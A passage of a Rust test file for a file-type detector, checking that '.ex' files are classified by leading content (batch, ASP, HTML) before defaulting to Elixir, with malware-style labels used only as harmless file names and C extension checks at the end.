        b"<script>not really</script>\nobject App\n",
        FileType::Scala,
    );
}

#[test]
fn ex_variant_letter_yields_to_a_leading_mark() {
    assert_detect(
        "Trojan.BAT.Agent.ex",
        b"@echo       off\r\ncopy a b\r\n",
        FileType::Batch,
    );
    assert_detect(
        "Backdoor.ASP.Ace.ex",
        b"<%@ LANGUAGE = VBScript.Encode %>\r\n<%\r\n",
        FileType::Asp,
    );
    assert_detect(
        "Exploit.JS.RealPlr.ex",
        b"<sCrIpT lAnGuAgE=\"jAvAsCrIpT\">\r\n",
        FileType::Html,
    );
    let mut utf16 = vec![0xff, 0xfe];
    for b in b"<!DOCTYPE HTML" {
        utf16.push(*b);
        utf16.push(0);
    }
    assert_detect("Trojan.JS.Agent.ex", &utf16, FileType::Html);
    assert_detect(
        "revshell.ex",
        b"defmodule Revshell do\n  def run do\n  end\nend\n",
        FileType::Elixir,
    );
    assert_detect("tool.exs", b"@echo off\r\n", FileType::Elixir);
}

// ── C/C++ ────────────────────────────────────────────────────────

#[test]
fn c_by_ext() {
    assert_ext("main.c", FileType::C);
    assert_ext("main.h", FileType::C);
    assert_ext("main.cpp", FileType::C);
    assert_ext("main.hpp", FileType::C);
}
